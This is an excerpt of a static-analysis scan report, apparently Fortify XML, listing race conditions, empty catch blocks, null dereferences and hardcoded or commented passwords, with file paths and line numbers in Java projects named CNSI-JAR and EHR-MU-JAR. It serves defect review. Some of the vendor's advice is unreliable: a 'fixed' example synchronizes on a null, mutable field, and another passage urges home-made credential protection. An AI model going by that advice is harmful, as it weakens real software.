                        <Issue iid="526242E6C506CA6DA19EDBE5393B831E" ruleID="3F30430E-C978-475D-97A0-37D917C45791">
                            <Category>Poor Style: Non-final Public Static Field</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>Non-final public static fields can be changed by external classes.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>DbUtilImpl.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/database/DbUtilImpl.java</FilePath>
<LineStart>143</LineStart>
<Snippet>     * this is set during initialization.
     */
    public static String USER_TXN_JNDI_NAME = null;

</Snippet>
<TargetFunction>Field: USER_TXN_JNDI_NAME()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="041133BF545A4CF5D29B7C1A60C16F15" ruleID="3F30430E-C978-475D-97A0-37D917C45791">
                            <Category>Poor Style: Non-final Public Static Field</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>Non-final public static fields can be changed by external classes.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>AppAreaDetCacheMgr.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/cache/AppAreaDetCacheMgr.java</FilePath>
<LineStart>30</LineStart>
<Snippet>
    /** String that holds type for tab app area *. */
    public static String VALUE_APP_AREA_TAB_TYPE="T";

    /** String that holds type for External link app area *. */</Snippet>
<TargetFunction>Field: VALUE_APP_AREA_TAB_TYPE()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="8A2476A36A6B2EDABC70C55ABDE3DD8F" ruleID="3F30430E-C978-475D-97A0-37D917C45791">
                            <Category>Poor Style: Non-final Public Static Field</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>Non-final public static fields can be changed by external classes.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ECAMSInitializer.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/ECAMSInitializer.java</FilePath>
<LineStart>52</LineStart>
<Snippet>     * This is the default user details.
     */
    public static UserDetails m_objMeCMSDefualtUser = null;

    /**</Snippet>
<TargetFunction>Field: m_objMeCMSDefualtUser()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="61">
                        <groupTitle>Race Condition: Singleton Member Field</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>The class JSPGeneratorImpl is a singleton, so the member field cqmStartingIndex is shared between users. The result is that one user could see another user's data.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>Many Servlet developers do not understand that a Servlet is a singleton. There is only one instance of the Servlet, and that single instance is used and re-used to handle multiple requests that are processed simultaneously by different threads.

A common result of this misunderstanding is that developers use Servlet member fields in such a way that one user may inadvertently see another user's data. In other words, storing user data in Servlet member fields introduces a data access race condition.

Example 1: The following Servlet stores the value of a request parameter in a member field and then later echoes the parameter value to the response output stream.


public class GuestBook extends HttpServlet {

   String name;

   protected void doPost (HttpServletRequest req, HttpServletResponse res) {
     name = req.getParameter("name");
     ...
     out.println(name + ", thanks for visiting!");
   }
}


While this code will work perfectly in a single-user environment, if two users access the Servlet at approximately the same time, it is possible for the two request handler threads to interleave in the following way:

	Thread 1:	assign "Dick" to name
	Thread 2:	assign "Jane" to name
	Thread 1:	print "Jane, thanks for visiting!"
	Thread 2:	print "Jane, thanks for visiting!"

Thereby showing the first user the second user's name.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>Do not use Servlet member fields for anything but constants. (i.e. make all member fields static final).

Developers are often tempted to use Servlet member fields for user data when they need to transport data from one region of code to another. If this is your aim, consider declaring a separate class and using the Servlet only to "wrap" this new class.

Example 2: The bug in Example 1 can be corrected in the following way:


public class GuestBook extends HttpServlet {

   protected void doPost (HttpServletRequest req, HttpServletResponse res) {
	GBRequestHandler handler = new GBRequestHandler();
	handler.handle(req, res);
   }
}

public class GBRequestHandler {

   String name;

   public void handle(HttpServletRequest req, HttpServletResponse res) {
     name = req.getParameter("name");
     ...
     out.println(name + ", thanks for visiting!");
   }

}


Alternatively, a Servlet can utilize synchronized blocks to access servlet instance variables but using synchronized blocks may cause significant performance problems.

Please notice that wrapping the field access within a synchronized block will only prevent the issue if all read and write operations on that member are performed within the same synchronized block or method.

Example 3: Wrapping the Example 1 write operation (assignment) in a synchronized block will not fix the problem since the threads will have to get a lock to modify name field, but they will release the lock afterwards, allowing a second thread to change the value again. If, after changing the name value, the first thread resumes execution, the value printed will be the one assigned by the second thread:


public class GuestBook extends HttpServlet {

   String name;

   protected void doPost (HttpServletRequest req, HttpServletResponse res) {
     synchronized(name) {
        name = req.getParameter("name");
     }
     ...
     out.println(name + ", thanks for visiting!");
   }
}


In order to fix the race condition, all the write and read operations on the shared member field should be run atomically within the same synchronized block:


public class GuestBook extends HttpServlet {

   String name;

   protected void doPost (HttpServletRequest req, HttpServletResponse res) {
     synchronized(name) {
        name = req.getParameter("name");
        ...
        out.println(name + ", thanks for visiting!");
     }
   }
}

</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>61</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="A74201F5C8D52B086AB7ABD188F632E5" ruleID="EF56638C-726C-4A6F-BF57-2CF912F8E031">
                            <Category>Race Condition: Singleton Member Field</Category>
                            <Folder>High</Folder>
                            <Kingdom>Time and State</Kingdom>
                            <Abstract>The class JSPGeneratorImpl is a singleton, so the member field startObjCategory is shared between users. The result is that one user could see another user's data.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>JSPGeneratorImpl.java</FileName>
<FilePath>EHR-MU-JAR/src/com/ehr/business/impl/JSPGeneratorImpl.java</FilePath>
<LineStart>1782</LineStart>
<Snippet>
	public void setStartObjCategory(boolean startObjCategory) {
		this.startObjCategory = startObjCategory;
	}
</Snippet>
<TargetFunction>AssignmentStatement()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="389865F81A12C288928DDE880DC18ACD" ruleID="EF56638C-726C-4A6F-BF57-2CF912F8E031">
                            <Category>Race Condition: Singleton Member Field</Category>
                            <Folder>High</Folder>
                            <Kingdom>Time and State</Kingdom>
                            <Abstract>The class JSPGeneratorImpl is a singleton, so the member field actualObjNum is shared between users. The result is that one user could see another user's data.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>JSPGeneratorImpl.java</FileName>
<FilePath>EHR-MU-JAR/src/com/ehr/business/impl/JSPGeneratorImpl.java</FilePath>
<LineStart>1766</LineStart>
<Snippet>
	public void setActualObjNum(int actualObjNum) {
		this.actualObjNum = actualObjNum;
	}
</Snippet>
<TargetFunction>AssignmentStatement()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="68D8462E13668C1D5439A6AE3D48B4FC" ruleID="EF56638C-726C-4A6F-BF57-2CF912F8E031">
                            <Category>Race Condition: Singleton Member Field</Category>
                            <Folder>High</Folder>
                            <Kingdom>Time and State</Kingdom>
                            <Abstract>The class JSPGeneratorImpl is a singleton, so the member field objNumber is shared between users. The result is that one user could see another user's data.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>JSPGeneratorImpl.java</FileName>
<FilePath>EHR-MU-JAR/src/com/ehr/business/impl/JSPGeneratorImpl.java</FilePath>
<LineStart>1758</LineStart>
<Snippet>
	public void setObjNumber(String objNumber) {
		this.objNumber = objNumber;
	}
</Snippet>
<TargetFunction>AssignmentStatement()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="CB0063A4646705FD38BA284B825209C5" ruleID="EF56638C-726C-4A6F-BF57-2CF912F8E031">
                            <Category>Race Condition: Singleton Member Field</Category>
                            <Folder>High</Folder>
                            <Kingdom>Time and State</Kingdom>
                            <Abstract>The class JSPGeneratorImpl is a singleton, so the member field cqmStartingIndex is shared between users. The result is that one user could see another user's data.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>JSPGeneratorImpl.java</FileName>
<FilePath>EHR-MU-JAR/src/com/ehr/business/impl/JSPGeneratorImpl.java</FilePath>
<LineStart>1750</LineStart>
<Snippet>
	public void setCqmStartingIndex(int cqmStartingIndex) {
		this.cqmStartingIndex = cqmStartingIndex;
	}
</Snippet>
<TargetFunction>AssignmentStatement()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="C3ECC4B9B16E59929F3DB54A62EEA02A" ruleID="EF56638C-726C-4A6F-BF57-2CF912F8E031">
                            <Category>Race Condition: Singleton Member Field</Category>
                            <Folder>High</Folder>
                            <Kingdom>Time and State</Kingdom>
                            <Abstract>The class JSPGeneratorImpl is a singleton, so the member field completeObjCategory is shared between users. The result is that one user could see another user's data.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>JSPGeneratorImpl.java</FileName>
<FilePath>EHR-MU-JAR/src/com/ehr/business/impl/JSPGeneratorImpl.java</FilePath>
<LineStart>1774</LineStart>
<Snippet>
	public void setCompleteObjCategory(boolean completeObjCategory) {
		this.completeObjCategory = completeObjCategory;
	}
</Snippet>
<TargetFunction>AssignmentStatement()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="54">
                        <groupTitle>Poor Error Handling: Empty Catch Block</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>The method closeRSandStmtFromRs() in DbUtilImpl.java ignores an exception on line 5911, which could cause the program to overlook unexpected states and conditions.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>Just about every serious attack on a software system begins with the violation of a programmer's assumptions. After the attack, the programmer's assumptions seem flimsy and poorly founded, but before an attack many programmers would defend their assumptions well past the end of their lunch break.

Two dubious assumptions that are easy to spot in code are "this method call can never fail" and "it doesn't matter if this call fails". When a programmer ignores an exception, they implicitly state that they are operating under one of these assumptions.

Example 1: The following code excerpt ignores a rarely-thrown exception from doExchange().


try {
  doExchange();
}
catch (RareException e) {
  // this can never happen
}


If a RareException were to ever be thrown, the program would continue to execute as though nothing unusual had occurred. The program records no evidence indicating the special situation, potentially frustrating any later attempt to explain the program's behavior.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>At a minimum, log the fact that the exception was thrown so that it will be possible to come back later and make sense of the resulting program behavior. Better yet, abort the current operation. If the exception is being ignored because the caller cannot properly handle it but the context makes it inconvenient or impossible for the caller to declare that it throws the exception itself, consider throwing a RuntimeException or an Error, both of which are unchecked exceptions. As of JDK 1.4, RuntimeException has a constructor that makes it easy to wrap another exception.

Example 2: The code in Example 1 could be rewritten in the following way:


try {
  doExchange();
}
catch (RareException e) {
  throw new RuntimeException("This can never happen", e);
}
</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Tips</Name>
<Value>1. There are rare types of exceptions that can be discarded in some contexts. For instance, Thread.sleep() throws InterruptedException, and in many situations the program should behave the same way whether or not it was awoken prematurely.


  try {
    Thread.sleep(1000);
  }
  catch (InterruptedException e){
    // The thread has been woken up prematurely, but its
    // behavior should be the same either way.
  }
</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>54</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="2A060CB6E2ECC5057888836856084486" ruleID="8843F319-8A22-4101-A378-C2B2F2597988">
                            <Category>Poor Error Handling: Empty Catch Block</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>The method evalCondition() in IfTag.java ignores an exception on line 213, which could cause the program to overlook unexpected states and conditions.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>IfTag.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/tag/IfTag.java</FilePath>
<LineStart>213</LineStart>
<Snippet>			result = oper.cmp(l_objPropertyValue, this.m_sControlValue);
		}
		catch(Exception p_Exception)
		{
			</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="EA24C85D7B878C5AFC8BBD31C43390FD" ruleID="8843F319-8A22-4101-A378-C2B2F2597988">
                            <Category>Poor Error Handling: Empty Catch Block</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>The method closeStatement() in DbUtilImpl.java ignores an exception on line 5931, which could cause the program to overlook unexpected states and conditions.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>DbUtilImpl.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/database/DbUtilImpl.java</FilePath>
<LineStart>5931</LineStart>
<Snippet>            }
        }
        catch (SQLException sqe)
        {
            // Yes, we really want to ignore this</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="9881E1544C79C64524EA2BCDBDE0FEB2" ruleID="8843F319-8A22-4101-A378-C2B2F2597988">
                            <Category>Poor Error Handling: Empty Catch Block</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>The method closeRSandStmtFromRs() in DbUtilImpl.java ignores an exception on line 5911, which could cause the program to overlook unexpected states and conditions.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>DbUtilImpl.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/database/DbUtilImpl.java</FilePath>
<LineStart>5911</LineStart>
<Snippet>            }
        }
        catch (SQLException sqe)
        {
            // Yes, we really want to ignore this</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="794A953D10D769B6097C7CFCEC110FF0" ruleID="8843F319-8A22-4101-A378-C2B2F2597988">
                            <Category>Poor Error Handling: Empty Catch Block</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>The method closeResultSet() in DbUtilImpl.java ignores an exception on line 5952, which could cause the program to overlook unexpected states and conditions.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>DbUtilImpl.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/database/DbUtilImpl.java</FilePath>
<LineStart>5952</LineStart>
<Snippet>            }
        }
        catch (SQLException sqe)
        {
            // Yes, we really want to ignore this</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="2452F5EB15B634D7C7D2FC427D6B9399" ruleID="8843F319-8A22-4101-A378-C2B2F2597988">
                            <Category>Poor Error Handling: Empty Catch Block</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>The method skip() in FileUtil.java ignores an exception on line 1101, which could cause the program to overlook unexpected states and conditions.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>FileUtil.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/file/FileUtil.java</FilePath>
<LineStart>1101</LineStart>
<Snippet>            }
        }
        catch (Exception e) {

        }</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="50">
                        <groupTitle>Null Dereference</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>The method main() in CNSIEditorBean.java can crash the program by dereferencing a null-pointer on line 513.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>Null-pointer exceptions usually occur when one or more of the programmer's assumptions is violated. A dereference-after-store error occurs when a program explicitly sets an object to null and dereferences it later. This error is often the result of a programmer initializing a variable to null when it is declared.


Most null-pointer issues result in general software reliability problems, but if attackers can intentionally trigger a null-pointer dereference, they can use the resulting exception to bypass security logic or to cause the application to reveal debugging information that will be valuable in planning subsequent attacks.

Example: In the following code, the programmer explicitly sets the variable foo to null. Later, the programmer dereferences foo before checking the object for a null value.


Foo foo = null;
...
foo.setBar(val);
...
}
</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>Implement careful checks before dereferencing objects that might be null. When possible, abstract null checks into wrappers around code that manipulates resources to ensure that they are applied in all cases and to minimize the places where mistakes can occur.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>50</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="BDEABD25CCCA6E4432525AEA57D0636A" ruleID="B32F92AC-9605-0987-E73B-CCB28279AA24">
                            <Category>Null Dereference</Category>
                            <Folder>High</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>The method getConnection() in DbUtilImpl.java can crash the program by dereferencing a null-pointer on line 391.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>DbUtilImpl.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/database/DbUtilImpl.java</FilePath>
<LineStart>391</LineStart>
<Snippet>        {
            m_objLogger.log(Logger.SEVERITY_FATAL, getClass(), l_sFnName,
                    "datasource not found: l_objEJBResourceFactory" + l_objEJBResourceFactory);
            throw exnm;
        }</Snippet>
<TargetFunction>Dereferenced : l_objEJBResourceFactory()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="6DE419F11047A2E0781F26D12B3CCEEA" ruleID="B32F92AC-9605-0987-E73B-CCB28279AA24">
                            <Category>Null Dereference</Category>
                            <Folder>High</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>The method main() in CNSIEditorBean.java can crash the program by dereferencing a null-pointer on line 513.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>CNSIEditorBean.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/CNSIEditorBean.java</FilePath>
<LineStart>513</LineStart>
<Snippet>		}finally{
			// Close the input stream
						br.close();
						in.close();
						if(fstream != null) {</Snippet>
<TargetFunction>Dereferenced : br()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="37DAF60D2E399745646D51F11EC9E185" ruleID="B32F92AC-9605-0987-E73B-CCB28279AA24">
                            <Category>Null Dereference</Category>
                            <Folder>High</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>The method main() in CNSIEditorBean.java can crash the program by dereferencing a null-pointer on line 514.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>CNSIEditorBean.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/CNSIEditorBean.java</FilePath>
<LineStart>514</LineStart>
<Snippet>			// Close the input stream
						br.close();
						in.close();
						if(fstream != null) {
							safeClose(fstream);</Snippet>
<TargetFunction>Dereferenced : in()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="D1D199D4683E223E633E8D2D4FDC2CE8" ruleID="B32F92AC-9605-0987-E73B-CCB28279AA24">
                            <Category>Null Dereference</Category>
                            <Folder>High</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>The method getMapUsingProcedure() in DbUtilImpl.java can crash the program by dereferencing a null-pointer on line 1493.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>DbUtilImpl.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/database/DbUtilImpl.java</FilePath>
<LineStart>1493</LineStart>
<Snippet>
                                        l_mapOuputData.put(l_sParameterName,
                                                b_lstNewList.toArray(b_objArray));

                                        break;</Snippet>
<TargetFunction>Dereferenced : b_lstNewList()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="2084FBA1A670246E107F5648C3653735" ruleID="B32F92AC-9605-0987-E73B-CCB28279AA24">
                            <Category>Null Dereference</Category>
                            <Folder>High</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>The method getInsertString() in DbUtilImpl.java can crash the program by dereferencing a null-pointer on line 680.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>DbUtilImpl.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/database/DbUtilImpl.java</FilePath>
<LineStart>680</LineStart>
<Snippet>                else
                {
                    b_sColumnDataType = (Integer) l_mapTableMetaData.get(l_sTemp);

                    if (b_sColumnDataType == null)</Snippet>
<TargetFunction>Dereferenced : l_mapTableMetaData()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="50">
                        <groupTitle>Password Management: Password in Comment</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>Storing passwords or password details in plain text anywhere in the system or system code may compromise system security in a way that cannot be easily remedied.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>It is never a good idea to hardcode a password. Storing password details within comments is equivalent to hardcoding passwords. Not only does it allow all of the project's developers to view the password, it also makes fixing the problem extremely difficult. After the code is in production, the password is now leaked to the outside world and cannot be protected or changed without patching the software. If the account protected by the password is compromised, the owners of the system must choose between security and availability.


Example: The following comment specifies the default password to connect to a database:


...
// Default username for database connection is "scott"
// Default password for database connection is "tiger"
...


This code will run successfully, but anyone who has access to it will have access to the password. After the program ships, there is likely no way to change the database user "scott" with a password of "tiger" unless the program is patched. An employee with access to this information can use it to break into the system.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>Passwords should never be hardcoded and should generally be obfuscated and managed in an external source. Storing passwords in plain text anywhere on the system allows anyone with sufficient permissions to read and potentially misuse the password.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>50</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="3363D82A2A32D4E480A3FAFF17155EFD" ruleID="720E3A66-55AC-4D2D-8DB9-DC30E120A52F">
                            <Category>Password Management: Password in Comment</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>Storing passwords or password details in plain text anywhere in the system or system code may compromise system security in a way that cannot be easily remedied.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>HiddenTag.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/tag/HiddenTag.java</FilePath>
<LineStart>131</LineStart>
<Snippet>    }//setControlValue

    /**
     * Sets the display type.
     * &lt;br&gt;</Snippet>
<TargetFunction>Comment()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="90C803FB30CA9CD33EACC81813E217BE" ruleID="720E3A66-55AC-4D2D-8DB9-DC30E120A52F">
                            <Category>Password Management: Password in Comment</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>Storing passwords or password details in plain text anywhere in the system or system code may compromise system security in a way that cannot be easily remedied.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>HiddenTag.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/tag/HiddenTag.java</FilePath>
<LineStart>17</LineStart>
<Snippet>import com.cnsi.common.tag.util.CNSITagUtil;
import com.cnsi.common.util.StringUtil;
/**
 * A Tag handler to generate Text fields / Text area / Password.
 * &lt;P&gt;</Snippet>
<TargetFunction>Comment()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="EDDA456B0E61780534207EF96C4B49B1" ruleID="720E3A66-55AC-4D2D-8DB9-DC30E120A52F">
                            <Category>Password Management: Password in Comment</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>Storing passwords or password details in plain text anywhere in the system or system code may compromise system security in a way that cannot be easily remedied.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>FileUtil.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/file/FileUtil.java</FilePath>
<LineStart>1262</LineStart>
<Snippet>		return l_objStringbuff.toString();
	}
	/**
	 * This method creates a file on a remote host/shared network drive using the SMB protocol. 
	 * @param p_sDomainName The domain name of the host</Snippet>
<TargetFunction>Comment()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="03899B649F8E4A636ED675FCC3D45A7D" ruleID="720E3A66-55AC-4D2D-8DB9-DC30E120A52F">
                            <Category>Password Management: Password in Comment</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>Storing passwords or password details in plain text anywhere in the system or system code may compromise system security in a way that cannot be easily remedied.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>DbUtilImpl.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/database/DbUtilImpl.java</FilePath>
<LineStart>330</LineStart>
<Snippet>    }

    /**
     * This method will open connection and return an object of the type java.sql.Connection.
     *</Snippet>
<TargetFunction>Comment()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="1FA3A9FE61A799EA037C753A672D23BE" ruleID="720E3A66-55AC-4D2D-8DB9-DC30E120A52F">
                            <Category>Password Management: Password in Comment</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>Storing passwords or password details in plain text anywhere in the system or system code may compromise system security in a way that cannot be easily remedied.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>FileUtil.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/file/FileUtil.java</FilePath>
<LineStart>1274</LineStart>
<Snippet>	 * @throws MalformedURLException
	 */
/*	public static void createRemoteFile(String p_sDomainName, String p_sHost, String p_sFolderName, String p_sUserName, String p_sPassword, String p_sFileName, byte[] p_byFileContents) throws IOException, MalformedURLException
	{
		String l_sSmbFileURL = "smb://"+p_sDomainName+";"+p_sUserName+":"+p_sPassword+"@"+p_sDomainName+"/"+p_sFolderName+"/"+p_sFileName;</Snippet>
<TargetFunction>Comment()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="39">
                        <groupTitle>Password Management: Hardcoded Password</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>Hardcoded passwords can compromise system security in a way that is not easy to remedy.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>It is never a good idea to hardcode a password. Not only does hardcoding a password allow all of the project's developers to view the password, it also makes fixing the problem extremely difficult. After the code is in production, the password cannot be changed without patching the software. If the account protected by the password is compromised, the owners of the system must choose between security and availability.


Example 1: The following code uses a hardcoded password to connect to a database:


...
DriverManager.getConnection(url, "scott", "tiger");
...


This code will run successfully, but anyone who has access to it will have access to the password. After the program ships, there is likely no way to change the database user "scott" with a password of "tiger" unless the program is patched. An employee with access to this information can use it to break into the system. Even worse, if attackers have access to the bytecode for the application they can use the javap -c command to access the disassembled code, which will contain the values of the passwords used. The result of this operation might look something like the following for Example 1:


javap -c ConnMngr.class

22: ldc   #36; //String jdbc:mysql://ixne.com/rxsql
24: ldc   #38; //String scott
26: ldc   #17; //String tiger


In the mobile environment, password management is especially important given that there is such a high chance of device loss.
Example 2: The following code uses hardcoded username and password to setup authentication for viewing protected pages with Android's WebView.

...
webview.setWebViewClient(new WebViewClient() {
  public void onReceivedHttpAuthRequest(WebView view,
        HttpAuthHandler handler, String host, String realm) {
    handler.proceed("guest", "allow");
  }
});
...


Similar to Example 1, this code will run successfully, but anyone who has access to it will have access to the password.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>Passwords should never be hardcoded and should generally be obfuscated and managed in an external source. Storing passwords in plain text anywhere on the system allows anyone with sufficient permissions to read and potentially misuse the password. At the very least, hash passwords before storing them.

Some third-party products claim the ability to securely manage passwords. For example, WebSphere Application Server 4.x uses a simple XOR encryption algorithm for obfuscating values, but be skeptical about such facilities. WebSphere and other application servers offer outdated and relatively weak encryption mechanisms that are insufficient for security-sensitive environments. Today, the best option for a secure generic solution is to create a proprietary mechanism yourself.

For Android, as well as any other platform that uses SQLite database, SQLCipher is a good alternative. SQLCipher is an extension to the SQLite database that provides transparent 256-bit AES encryption of database files. Thus, credentials can be stored in an encrypted database.

